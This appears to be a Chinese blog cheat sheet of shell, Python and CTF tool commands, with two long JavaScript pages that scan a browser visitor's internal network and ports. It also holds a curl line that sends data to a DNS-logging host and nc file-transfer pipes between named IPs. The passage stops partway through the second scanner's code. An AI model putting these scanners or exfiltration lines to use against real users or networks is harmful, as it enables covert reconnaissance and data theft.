---
title: 常用shell命令及相关工具（shell+python+tools）
abbrlink: 33488
date: 2018-04-24 10:27:37
tags:
---

## 统计文件中每个字符串的长度

> grep -o . file.txt | sort | uniq -c | sort -rn

## Python将16进制字符串转化为ascii码

> a = "456e"
>
> ''.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])

## Python将16进制字符串转为2进制字符串

> a = "456e"
>
> ''.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])

## Python二进制字符串转16进制字符串

> str = "0100010101101110"
>
> ''.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])

##hexdump使用

> hexdump [filename]  以16进制查看文件
>
> hexdumlp -C [filename] 以16进制查看文件同时显示ascii码

##7z使用

> 7z x [压缩包]

##binwalk使用

> binwalk [filename] 查看文件信息
>
> binwalk -e [filename]  提取文件

##strings使用

> strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串

##base64使用

> echo [base64字符串] | base64 -d              base64解密
>
> echo [字符串] | base64                              base64加密

##debin,ubuntu删除所有带 rc 标记的dpkg包

> dpkg -l | grep ^rc | cut -d' ' -f3 | sudo xargs dpkg --purge

##批量计算文件夹中所有文件md5值

> md5sum *

##LSB检查

> ```python
> >>> import Image
> >>> a=Image.open('zxczxc.png')
> >>> a.point(lambda i: 255 if i&1 else 0).show()
> ```

##查看文件夹下边的某个字符串

> grep -rn -A10 -B5 "php_string_shuffle" ./
>
> grep -rn -A10 -B5 "php_string_shuffle" -l ./          只列出文件名

##监控目录变化

> watch -n2 ls -l /proc/11631/fd/

##dd命令使用

>  dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1
>
>  dd if=./test of=./test1 count=1 bs=3 skip=2
>
>  if 从目标文件中提取数据
>
>  of 提取的数据保存的位置
>
>  count 从目标文件中提取的块数
>
>  bs 一次性读取或者写入的字节数
>
>  skip 跳过几个块
>
>  上边的命令就是从test文件中的第6(skip * bs = 2 * 3)个字节开始，读3（count * bs = 1 * 3）个字节，写入到test1文件中。

##shell文件去重

> sort filename | uniq

##socat启动一道pwn题目

> socat tcp-l:8080,fork exec:./note,reuseaddr

##exiftool使用

>exiftool [picture_name]
>
>exiftool -Exif:ImageDescription="%^&*()[]{}" [picture_name]

##curl发送请求

> curl -d "param1=value1&param2=value2" -b "cookie_name1=value1&cookie_name2=value2" url 

> curl上传文件，传递多个参数，一个参数需要一个`-F`
>
> curl -F "file=@composer.json" -F "chunks=3" -F "chunk=1" -F "name=1.jsp" "http://localhost:8080/fileupload"

> url中需要转义字符如下:
>
> `[`,`]`,`{`,`}`

> curl保存cookie到文件中，并使用该cookie，可以及时更新cookie
>
> > curl -v www.baidu.com -c ./cookie -b ./cookie 
>
> curl 发送json字符串
>
>  curl -v -H "Content-Type:application/json" -X POST --data '{"code":"cwdjwz"}' http://35.207.132.47/api/verify

## grep匹配字符串
> grep -Eo "regex_expr"

>  grep -i "connection" -r ./ --include *.class         # 递归在目录中class结尾的文件中查询字符串
>
>  grep -i "connection" -r ./ --include *.{class|xml}

##查找文件
> find / -name "flag"

##ngrep监听80端口
> ngrep -W byline -d eth0 port 80

##scp命令使用

> A.104.238.161.75，B.43.224.34.73
>
>
>
> A服务器下操作，将B服务器下/home/lk目录下所有文件复制到本地/home目录下
>
> scp -r root@43.224.34.73:/home/lk /home
>
>
>
> 在A服务器上将/root/lk目录下所有的文件传输到B的/home/lk/cpfile目录下
>
> scp -r /root/lk root@43.224.34.73:/home/lk/cpfile

##nc传送文件

> A.104.238.161.75     B.43.224.34.73
>
> 将B服务器文件【test.txt】从B服务器传送到A服务器下
>
> 方案一: 
>
> A: nc -l [port] > text.txt
>
> B: nc 104.238.161.75 [port] < test.txt
>
> 方案二:
>
> A: nc 43.224.34.73 [port] > test.txt
>
> B: nc -l [port] < test.txt
>
>
>
> 传输目录:
>
> A机器给B机器发送多个文件,需要结合其它的命令，比如tar,经过测试管道后面最后必须是 - ，不能是其余自定义的文件名
>
> B: nc -l [port] | tar xfvz -
>
> A: tar cfz - * | nc 43.224.34.73 [port]

##tcpdump抓包

> sudo tcpdump tcp -c 100 -i ens33  -nn -XX -vv
>
> -c    抓取的数量
>
> -i     指定端口
>
>
>
> sudo tcpdump -c 100 -XX -nn -vv -i ens33 tcp[20:2]=0x4745 or tcp[20:2]=0x4854
>
> 抓取网卡ens33中的http包
>
> 0x4745 => 'GE'           0x4854   => "HT"
```
tcpdump [ -DenNqvX ] [ -c count ] [ -F file ] [ -i interface ] [ -r file ]
        [ -s snaplen ] [ -w file ] [ expression ]

抓包选项：
-c：指定要抓取的包数量。注意，是最终要获取这么多个包。例如，指定"-c 10"将获取10个包，但可能已经处理了100个包，只不过只有10个包是满足条件的包。
-i interface：指定tcpdump需要监听的接口。若未指定该选项，将从系统接口列表中搜寻编号最小的已配置好的接口(不包括loopback接口，要抓取loopback接口使用tcpdump -i lo)，
            ：一旦找到第一个符合条件的接口，搜寻马上结束。可以使用'any'关键字表示所有网络接口。
-n：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析。
-nn：除了-n的作用外，还把端口显示为数值，否则显示端口服务名。
-N：不打印出host的域名部分。例如tcpdump将会打印'nic'而不是'nic.ddn.mil'。
-P：指定要抓取的包是流入还是流出的包。可以给定的值为"in"、"out"和"inout"，默认为"inout"。
-s len：设置tcpdump的数据包抓取长度为len，如果不设置默认将会是65535字节。对于要抓取的数据包较大时，长度设置不够可能会产生包截断，若出现包截断，
      ：输出行中会出现"[|proto]"的标志(proto实际会显示为协议名)。但是抓取len越长，包的处理时间越长，并且会减少tcpdump可缓存的数据包的数量，
      ：从而会导致数据包的丢失，所以在能抓取我们想要的包的前提下，抓取长度越小越好。

输出选项：
-e：输出的每行中都将包括数据链路层头部信息，例如源MAC和目标MAC。
-q：快速打印输出。即打印很少的协议相关信息，从而输出行都比较简短。
-X：输出包的头部数据，会以16进制和ASCII两种方式同时输出。
-XX：输出包的头部数据，会以16进制和ASCII两种方式同时输出，更详细。
-v：当分析和打印的时候，产生详细的输出。
-vv：产生比-v更详细的输出。
-vvv：产生比-vv更详细的输出。

其他功能性选项：
-D：列出可用于抓包的接口。将会列出接口的数值编号和接口名，它们都可以用于"-i"后。
-F：从文件中读取抓包的表达式。若使用该选项，则命令行中给定的其他表达式都将失效。
-w：将抓包数据输出到文件中而不是标准输出。可以同时配合"-G time"选项使得输出文件每time秒就自动切换到另一个文件。可通过"-r"选项载入这些文件以进行分析和打印。
-r：从给定的数据包文件中读取数据。使用"-"表示从标准输入中读取。
```

## 临时DNS解析网站

http://dnsbin.zhack.ca/#master=a901ccef8fc26818ea0e

使用方法: ``` curl [mydatahere].7250305a7aa136b15585.d.zhack.ca```

## 全种类浏览器内网IP地址扫描（javascript版）

```


<!DOCTYPE html>
<html>
  <head>
    <style>
      .TreeNode, .Container {
        background-position: left top;
        background-size: 1em;
        background-repeat: no-repeat;
      }
      .TreeNode .TreeNode {
        padding-left: 1em;
        background-image: url(child.svg);
      }
      .TreeNode .TreeNode .Container {
        padding-left: 1em;
        margin-left: -1em;
        background-image: url(extend-child.svg);
        background-repeat: repeat-y;
      }
      .TreeNode .TreeNode:last-child {
        background-image: url(last-child.svg);
      }
      .TreeNode .TreeNode:last-child .Container {
        background-image: none;
      }
    </style>
    <script src="fGetIPAddresses.js"></script>
    <script src="fXHRScanIPAddressPorts.js"></script>
    <script src="fxIPAddress.js"></script>
    <script>
      onload = function fWindow_load_EventHandler() {
        var uStartTime = new Date().valueOf();
        function fsGetTime() {
          var uTimeSeconds = Math.round((new Date().valueOf() - uStartTime) / 1000),
              uTimeMinutes = Math.floor(uTimeSeconds / 60) % 60,
              uTimeHours = Math.floor(uTimeSeconds / 60 / 60);
          return (
            (uTimeHours ? uTimeHours + " hours, " : "") +
            (uTimeMinutes ? uTimeMinutes + " minutes, " : "") +
            (uTimeSeconds % 60) + " seconds"
          );
        };
        var oInterval = setInterval(function () {
          document.title = "Scanning (" + fsGetTime() + ")...";
        }, 1000);
        fGetIPAddresses(
          oIFrame,
          function fGetIPAddressSuccessCallback(asIPAddresses) {
            if (asIPAddresses.length == 0) {
              document.body.appendChild(new cTreeNode("Your local IP address could not be determined.", "error.svg").oRootElement);
              return;
            }
            fScanNetworksForIPAddresses(asIPAddresses, function() {
              document.title = "Done.";
              clearInterval(oInterval);
              document.body.appendChild(new cTreeNode("Scanning took " + fsGetTime() + ".", "info.svg").oRootElement);
              // done scanning.
            });
          },
          function fGetIPAddressErrorCallback(sErrorMessage) {
            document.body.appendChild(new cTreeNode(sErrorMessage, "error.svg").oRootElement);
          }
        );
      };
      function fScanNetworksForIPAddresses(asIPAddresses, fCallback) {
        (function fScanNetworksForIPAddressesLoop() {
          if (asIPAddresses.length != 0) {
            return fScanNetwork(asIPAddresses.shift(), fScanNetworksForIPAddressesLoop);
          };
          fCallback();
        })();
      };
      function fScanNetwork(sIPAddress, fCallback) {
        var oNetworkTreeNode = new cTreeNode("Determining subnet for " + sIPAddress + "...", "scanning.svg"),
            uIPAddress = fuIPAddress(sIPAddress);
        document.body.appendChild(oNetworkTreeNode.oRootElement);
        fGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, function (uPrefixLength) {
          oNetworkTreeNode.setName("Scanning network " + sIPAddress + "/" + uPrefixLength + "...")
          var uBitMask = - (1 << (32 - uPrefixLength)),
              uAllOnes = (1 << (32 - uPrefixLength)) - 1,
              uStartIPAddress = uIPAddress & uBitMask,
              uEndIPAddress = uIPAddress | uAllOnes,
              uCurrentIPAddress = uStartIPAddress + 1,
              uScansStarted = 0,
              uScansFinished = 0;
          function fScanIPAddressThread() {
            uScansStarted++;
            if (uCurrentIPAddress != uEndIPAddress) {
              var sCurrentIPAddress = fsIPAddress(uCurrentIPAddress);
              if (uCurrentIPAddress == uIPAddress) {
                oTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress + " (you)", "machine.svg"));
                uCurrentIPAddress++;
                fScanIPAddressThread(); // no need to scan self.
              } else {
                oTreeNode = oNetworkTreeNode.appendChild(new cTreeNode(sCurrentIPAddress, "scanning.svg"));
                fScanIPAddress(uCurrentIPAddress++, oTreeNode, fScanIPAddressThread);
              };
              return;
            };
            oNetworkTreeNode.setName("Network " + sIPAddress + "/" + uPrefixLength)
            oNetworkTreeNode.setIcon("network.svg")
            uScansFinished++;
            if (uScansStarted == uScansFinished) {
              fCallback();
            };
          };
          for (var uThreads = 64; uThreads--;) setTimeout(fScanIPAddressThread);
        });
      };
      
      function fGetNetworkSubnetPrefixLength(uIPAddress, oNetworkTreeNode, fCallback) {
        // Attempting to make an XHR to the broadcast address will result in an immediate error. Attempting to make an
        // XHR to an unused IP address will result in a time-out. We'll start with a large prefix and try increasingly
        // smaller ones to look for potential broadcast addresses using this timing difference. An IP address can also
        // be in-use by a *nix machine, which will also result in an immediate error. In an attempt to distinguish
        // between these two, try the next smaller prefix as well: if that fails, assume the former prefix is right and
        // return. Obviously this is not perfect, but it seems to work well enough.
        var uPrefixLength = 26,
            bBroadcastAddressMayHaveBeenFound = false,
            oTreeNode = oNetworkTreeNode.appendChild(new cTreeNode("", "scanning.svg"));
        (function fTestPrefixLength() {
          if (uPrefixLength >= 16) {
            var uAllOnes = (1 << (32 - uPrefixLength)) - 1,
                sBroadcastIPAddress = fsIPAddress(uIPAddress | uAllOnes);
            oTreeNode.setName("Testing potential broadcast address " + sBroadcastIPAddress + " (/" + uPrefixLength + ")...");
            fXHRScanIPAddressPorts(sBroadcastIPAddress, [2], function(auDetectedPortNumbers) {
              if (auDetectedPortNumbers.length > 0) {
                // This IP address results in an immediate error. It may be the broadcast address.
                if (uPrefixLength == 16) {
                  // We won't try to scan larger networks: use this.
                  oTreeNode.remove();
                  return fCallback(uPrefixLength);
                };
                bBroadcastAddressMayHaveBeenFound = true;
                // Try the next: in most setups this should fail if we just found the broadcast address.
                uPrefixLength--;
                return fTestPrefixLength();
              };
              if (!bBroadcastAddressMayHaveBeenFound) {
                // This IP address is not used, nor was the previously tested one: try the next.
                uPrefixLength--;
                return fTestPrefixLength();
              };
              // This IP address is not used, so the previous one is probably the broadcast address.
              oTreeNode.remove();
              fCallback(uPrefixLength + 1);
            });
            return;
          };
          oTreeNode.setName("Could not determine subnet, assuming /24...");
          oTreeNode.setIcon("error.svg");
          fCallback(8);
        })();
      };
      
      function fScanIPAddress(uIPAddress, oMachineTreeNode, fCallback) {
        var sIPAddress = fsIPAddress(uIPAddress);
        oMachineTreeNode.setName(sIPAddress);
        oMachineTreeNode.setIcon("scanning.svg");
        // check if machine responds on the SMB/RDP ports, which both Windows and *nix machines might.
        fXHRScanIPAddressPorts(sIPAddress, [80, 443, 445, 3389], function(auDetectedPortNumbers) {
          // no response on this port: assume IP address not in use.
          if (auDetectedPortNumbers.length == 0) {
            oMachineTreeNode.remove();
            return fCallback();
          };
          // check if machine responds to other ports that are very unlikely to be in use:
          fXHRScanIPAddressPorts(sIPAddress, [2], function(auDetectedPortNumbers) {
            if (auDetectedPortNumbers.length > 0) {
              // machine responds to ports that are very unlikely to be in use: probably *nix.
              oMachineTreeNode.setIcon("machine.svg");
              return fCallback();
            };
            // check again as this is somewhat unreliable:
            fXHRScanIPAddressPorts(sIPAddress, [3], function(auDetectedPortNumbers) {
              if (auDetectedPortNumbers.length > 0) {
                // machine responds to ports that are very unlikely to be in use: probably *nix.
                oMachineTreeNode.setIcon("machine.svg");
              } else {
                // machine does not appear to respond to ports that are not in use: probably Windows.
                oMachineTreeNode.setIcon("windows.svg");
              };
              fCallback();
            });
          });
        });
      };
      function cTreeNode(sNodeName, sIconURL) {
        this.oRootElement = document.createElement("div");
        this.oRootElement.className = "TreeNode";
        oNodeElement = this.oRootElement.appendChild(document.createElement("div"))
        this.oNodeIconImageNode = oNodeElement.appendChild(document.createElement("img"));
        this.oNodeIconImageNode.style.setProperty("vertical-align", "top");
        this.oNodeIconImageNode.style.setProperty("width", "1em");
        if (sIconURL) {
          this.oNodeIconImageNode.src = sIconURL;
        } else {
          this.oNodeIconImageNode.style.setProperty("display", "none");
        };
        oNodeNameTextElement = oNodeElement.appendChild(document.createElement("span"))
        this.oNodeNameTextNode = oNodeNameTextElement.appendChild(document.createTextNode(sNodeName));
        oNodeNameTextElement.style.setProperty("margin-left", "0.25em");
        this.oContainerElement = this.oRootElement.appendChild(document.createElement("div"));
        this.oContainerElement.className = "Container";
      };
      cTreeNode.prototype.setName = function cTreeNode_setName(sNewName) {
        this.oNodeNameTextNode.nodeValue = sNewName;
      };
      cTreeNode.prototype.setIcon = function cTreeNode_setName(sIconURL) {
        this.oNodeIconImageNode.style.setProperty("display", "inline-block");
        this.oNodeIconImageNode.src = sIconURL;
      };
      cTreeNode.prototype.appendChild = function cTreeNode_appendChild(oChildTreeNode) {
        this.oContainerElement.appendChild(oChildTreeNode.oRootElement);
        return oChildTreeNode;
      };
      cTreeNode.prototype.remove = function cTreeNode_remove() {
        this.oRootElement.parentNode.removeChild(this.oRootElement);
      };
    </script>
  </head>
  <body>
    <iframe id="oIFrame" sandbox="allow-same-origin" style="display: none"></iframe>
  </body>
</html>
```

## 异步内网IP扫描

```

<!doctype HTML>
<html>
<head>
<meta charset="UTF-8" />
<title>PortSwigger port scanner</title>
</head>
<body>
<iframe class="iframe_webrtc" sandbox="allow-same-origin" style="display: none"></iframe>
<script>
class PortScanner {
  constructor() {
    this.detectBrowser();
    this.detectOS();
    this.restrictedPorts = {
            Chrome: [1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,3659,4045,6000,6665,6666,6667,6668,6669,6697,65535],
            Firefox: [1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,2,110,3,111,113,115,117,119,123,135,139,143,2,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,3,2049,4045,6000],
            Edge: [19, 21, 25, 110, 119, 143, 220, 993, ],
            Safari: [1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,3659,4045,6000,6665,6666,6667,6668,6669,6697,65535]};
  }
  setUrl(url) {
    this.url = url;
  }
  detectOS() {
    if(/Mac/i.test(navigator.platform)){
      this.os = "Mac";
    } else if(/Linux/i.test(navigator.platform)){
      this.os = "Linux";
    } else if(/^Win/i.test(navigator.platform)){
      this.os = "Windows";
    }
  }
  detectBrowser() {
    this.browser = /Google/i.test(navigator.vendor)?'Chrome':/Apple/i.test(navigator.vendor)?'Safari':[].toSource?'Firefox':top.msCredentials?'Edge':'Unsupported';
  }
  getCommonHttpPorts() {
    return [66,80,81,443,445,457,1080,1100,1241,1352,1337,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8888,30821].filter(x=>!~this.restrictedPorts[this.browser].indexOf(x));
  }
  getCommonPorts() {
    return [1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1102,1104,1105,1106,1107,1108,1110,1111,1112,1113,1114,1117,1119,1121,1122,1123,1124,1126,1130,1131,1132,1137,1138,1141,1145,1147,1148,1149,1151,1152,1154,1163,1164,1165,1166,1169,1174,1175,1183,1185,1186,1187,1192,1198,1199,1201,1213,1216,1217,1218,1233,1234,1236,1244,1247,1248,1259,1271,1272,1277,1287,1296,1300,1301,1309,1310,1311,1322,1328,1334,1352,1417,1433,1434,1443,1455,1461,1494,1500,1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687,1688,1700,1717,1718,1719,1720,1721,1723,1755,1761,1782,1783,1801,1805,1812,1839,1840,1862,1863,1864,1875,1900,1914,1935,1947,1971,1972,1974,1984,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2013,2020,2021,2022,2030,2033,2034,2035,2038,2040,2041,2042,2043,2045,2046,2047,2048,2049,2065,2068,2099,2100,2103,2105,2106,2107,2111,2119,2121,2126,2135,2144,2160,2161,2170,2179,2190,2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381,2382,2383,2393,2394,2399,2401,2492,2500,2522,2525,2557,2601,2602,2604,2605,2607,2608,2638,2701,2702,2710,2717,2718,2725,2800,2809,2811,2869,2875,2909,2910,2920,2967,2968,2998,3000,3001,3003,3005,3006,3007,3011,3013,3017,3030,3031,3052,3071,3077,3128,3168,3211,3221,3260,3261,3268,3269,3283,3300,3301,3306,3322,3323,3324,3325,3333,3351,3367,3369,3370,3371,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,3826,3827,3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000,4001,4002,4003,4004,4005,4006,4045,4111,4125,4126,4129,4224,4242,4279,4321,4343,4443,4444,4445,4446,4449,4550,4567,4662,4848,4899,4900,4998,5000,5001,5002,5003,5004,5009,5030,5033,5050,5051,5054,5060,5061,5080,5087,5100,5101,5102,5120,5190,5200,5214,5221,5222,5225,5226,5269,5280,5298,5357,5405,5414,5431,5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678,5679,5718,5730,5800,5801,5802,5810,5811,5815,5822,5825,5850,5859,5862,5877,5900,5901,5902,5903,5904,5906,5907,5910,5911,5915,5922,5925,5950,5952,5959,5960,5961,5962,5963,5987,5988,5989,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6009,6025,6059,6100,6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565,6566,6567,6580,6646,6666,6667,6668,6669,6689,6692,6699,6779,6788,6789,6792,6839,6881,6901,6969,7000,7001,7002,7004,7007,7019,7025,7070,7100,7103,7106,7200,7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777,7778,7800,7911,7920,7921,7937,7938,7999,8000,8001,8002,8007,8008,8009,8010,8011,8021,8022,8031,8042,8045,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8093,8099,8100,8180,8181,8192,8193,8194,8200,8222,8254,8290,8291,8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651,8652,8654,8701,8800,8873,8888,8899,8994,9000,9001,9002,9003,9009,9010,9011,9040,9050,9071,9080,9081,9090,9091,9099,9100,9101,9102,9103,9110,9111,9200,9207,9220,9290,9415,9418,9485,9500,9502,9503,9535,9575,9593,9594,9595,9618,9666,9876,9877,9878,9898,9900,9917,9929,9943,9944,9968,9998,9999,10000,10001,10002,10003,10004,10009,10010,10012,10024,10025,10082,10180,10215,10243,10566,10616,10617,10621,10626,10628,10629,10778,11110,11111,11967,12000,12174,12265,12345,13456,13722,13782,13783,14000,14238,14441,14442,15000,15002,15003,15004,15660,15742,16000,16001,16012,16016,16018,16080,16113,16992,16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221,20222,20828,21571,22939,23502,24444,24800,25734,25735,26214,27000,27352,27353,27355,27356,27715,28201,30000,30718,30951,31038,31337,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,32784,32785,33354,33899,34571,34572,34573,35500,38292,40193,40911,41511,42510,44176,44442,44443,44501,45100,48080,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49163,49165,49167,49175,49176,49400,49999,50000,50001,50002,50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600,56737,56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389
    ].filter(x=>!~this.restrictedPorts[this.browser].indexOf(x));
  }
  updateProgress(port) {
    this.progress.innerText = 'Scanning '+this.pos + ' of ' + this.total + ' using port '+port + ' on '+this.url.replace(/^http:\/\//,"");
  }
  next() {
    if(this.q.length) {
      this.pos++;
      this.scan();
      return true;
    } else {
      this.complete();
      return false;
    }
  }
  complete() {
    if(this.openPorts.length) {
      this.progress.innerText = "The following ports are open:"+this.openPorts+' on '+this.url.replace(/^http:\/\//,"");
    } else {
      document.body.removeChild(this.progress);
    }
    if(this.hooks && this.hooks.oncomplete) {
      this.hooks.oncomplete();
    }
  }
  async scanChromeWindows() {
    var that = this;
    let promise = new Promise(function(resolve,reject){
        that.hooks = {oncomplete:function(){
          var iframes = document.getElementsByClassName('chrome');
          while(iframes.length > 0){
            iframes[0].parentNode.removeChild(iframes[0]);
          }
          resolve();
        }};
        that.scan = function(){
          var port = that.q.shift(), id = 'chrome'+(that.pos%500), iframe = document.getElementById(id) ? document.getElementById(id) : document.createElement('iframe'), timer, calls = 0;
          iframe.style.display = 'none';
          iframe.id = iframe.name = id;
          iframe.src = that.url + ":" + port;
          iframe.className = 'chrome';
          that.updateProgress(port);
          iframe.hasLoadedOnce = 0;
          iframe.onload = function(){
            calls++;
            if(calls > 1) {
              clearTimeout(timer);
              that.next();
              return;
            }
            iframe.hasLoadedOnce = 1;
            var a = document.createElement('a');
              a.target = iframe.name;
              a.href = iframe.src + '#';
              a.click();
              a = null;
          };
          timer = setTimeout(function(){
            if(iframe.hasLoadedOnce) {
              that.openPorts.push(port);
            }
            if(that.connections <= that.maxConnections) {
              that.next();
              that.connections++;
            }
          }, 3000);
          if(!document.body.contains(iframe)) {
            document.body.appendChild(iframe);
          }
        };
        that.scan();
    });
    return promise;
  }
  async scanEdge() {
    var that = this;
    let promise = new Promise(function(resolve, reject){
      that.hooks = {oncomplete:function(){
        var iframes = document.getElementsByClassName('edge');
        while(iframes.length > 0){
          iframes[0].parentNode.removeChild(iframes[0]);
        }
        resolve();
      }};
      that.scan = function(){
        var port = that.q.shift(), id = 'edge'+(that.pos%50), iframe = document.getElementById(id) ? document.getElementById(id) : document.createElement('iframe'), calls = 0;
        iframe.style.display = 'none';
        iframe.id = iframe.name = id;
        iframe.src = that.url + ":" + port;
        iframe.className = 'edge';
        that.updateProgress(port);
        iframe.hasLoadedOnce = 0;
        iframe.onload = function(){
          calls++;
          if(calls > 1) {
            that.openPorts.push(port);
            that.next();
            return;
          }
          iframe.hasLoadedOnce = 1;
          var a = document.createElement('a');
            a.target = iframe.name;
            a.href = 'ms-appx-web://microsoft.microsoftedge/assets/errorpages/dnserror.html#123';
            a.click();
            a = null;
            if(calls == 1) {
              that.next();
            }
        };
        if(!document.body.contains(iframe)) {
          document.body.appendChild(iframe);
        }
      };
      that.scan();
    });
    return promise;
  }
  async scanFirefox() {
    var that = this;
    let promise = new Promise(function(resolve,reject){
        that.hooks = {oncomplete:function(){
          var iframes = document.getElementsByClassName('firefox');
          while(iframes.length > 0){
            iframes[0].parentNode.removeChild(iframes[0]);
          }
          resolve();
        }};
        that.scan = function(){
          var port = that.q.shift(), id = 'firefox'+(that.pos%1000), iframe = document.getElementById(id) ? document.getElementById(id) : document.createElement('iframe'), timer;
          iframe.style.display = 'none';
          iframe.id = id;
          iframe.src = that.url + ":" + port;
          iframe.className = 'firefox';
          that.updateProgress(port);
          iframe.onload = function(){
              that.openPorts.push(port);
              clearTimeout(timer);
              that.next();
          };
          timer = setTimeout(function(){
            that.next();
          }, 50);
          if(!document.body.contains(iframe)) {
            document.body.appendChild(iframe);
          }
        };
        that.scan();
    });
    return promise;
  }
  async scanChromeLinux(iframe, a) {
    var that = this;
    let promise = new Promise(function(resolve, reject){
        that.hooks = {oncomplete:function(){
          document.body.removeChild(iframe);
          resolve();
        }};
        that.scan = function() {
            var port = that.q.shift(), calls = 0, timer;
            iframe.src = that.url + ":" + port;
            a.href = iframe.src + '#';
            that.updateProgress(port);
            iframe.hasLoadedOnce = 0;
            iframe.onload = function(){
                calls++;
                if(calls > 1) {
                  clearTimeout(timer);
                  that.next();
                  return;
                }
                iframe.hasLoadedOnce = 1;
                a.click();
            };
            timer = setTimeout(function(){
              if(iframe.hasLoadedOnce) {
                that.openPorts.push(port);
              }
              that.next();
            }, 3000);
        };
        that.scan();
    });
    return promise;
  }
  async scanArray(ports) {
      ports = ports.filter(x=>!~this.restrictedPorts[this.browser].indexOf(x));
      var that = this;
      let promise = new Promise(async function(resolve,reject){
          that.openPorts = [];
          that.closedPorts = [];
          that.pos = 1;
          that.q = ports.slice();
          that.total = that.q.length;
          that.progress = document.createElement('div');
          document.body.appendChild(that.progress);
          if((that.os === 'Mac' || that.os === 'Linux') && (that.browser === 'Chrome' || that.browser === 'Safari')) {
            let iframe = document.createElement('iframe'), a = document.createElement('a');
            iframe.style.display = 'none';
            iframe.name = a.target = 'probe'+Date.now();
            document.body.appendChild(iframe);
            await that.scanChromeLinux(iframe, a);
          } else if(that.browser === 'Firefox') {
            await that.scanFirefox();
          } else if(that.browser === 'Edge') {
            await that.scanEdge();
          } else if(that.os === 'Windows' && (that.browser === 'Chrome' || that.browser === 'Safari')) {
            that.connections = 0;
            that.maxConnections = 150;
            await that.scanChromeWindows();
          }
          resolve();
      });
      return promise;
  }
  async scanRange(start, end) {
    const length = end - start;
    return await this.scanArray(Array.from({ length }, (_, i) => start + i));
  }
  async scanPort(port) {
    return await this.scanArray([port]);
  }
  getIPRange(ip) {
    let ipParts = ip.split('.'), ranges = [];
    ipParts.pop();
    for(let i=1;i<=254;i++) {
      ranges.push(ipParts.join('.')+'.'+i);
    }
    return ranges;
  }
  async getLocalIPs(){
      let promise = new Promise(function(resolve, reject){
        var ip_dups = {};
        var RTCPeerConnection = window.RTCPeerConnection
            || window.mozRTCPeerConnection
            || window.webkitRTCPeerConnection;
        var useWebKit = !!window.webkitRTCPeerConnection;
        if(!RTCPeerConnection){
            var win = document.querySelector('.iframe_webrtc').contentWindow;
            RTCPeerConnection = win.RTCPeerConnection
                || win.mozRTCPeerConnection
                || win.webkitRTCPeerConnection;
            useWebKit = !!win.webkitRTCPeerConnection;
        }
        var mediaConstraints = {
            optional: [{RtpDataChannels: true}]
        };
        var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
        if(!RTCPeerConnection) {
          reject();
          return;
        }
        var pc = new RTCPeerConnection(servers, mediaConstraints);
        function handleCandidate(candidate){
            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
            var ip_addr = ip_regex.exec(candidate)[1];
            if(ip_dups[ip_addr] === undefined)
                resolve(ip_addr)
            ip_dups[ip_addr] = true;
        }
